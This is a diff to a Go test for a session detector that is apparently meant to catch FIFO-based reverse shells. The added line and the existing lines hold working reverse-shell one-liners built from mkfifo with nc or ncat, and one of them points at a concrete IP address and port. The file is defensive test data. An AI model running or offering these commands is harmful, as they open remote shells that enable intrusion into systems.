@@ -218,6 +218,7 @@ func TestSessionDetectsFIFOReverseShellWithoutTrace(t *testing.T) {
 	attacks := []string{
 		`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 101.132.185.173 18889 > /tmp/f`,
 		`mkfifo /tmp/f; if maybe; then cat /tmp/f | sh -i | ncat host 18889 > /tmp/f; fi`,
+		`mkfifo /tmp/f; if [[ $RANDOM ]]; then if [[ $RANDOM ]]; then cat /tmp/f | bash -i | nc host 18889 > /tmp/f; fi; fi`,
 	}
 	for _, attack := range attacks {
 		err := simulateWithSession(attack)
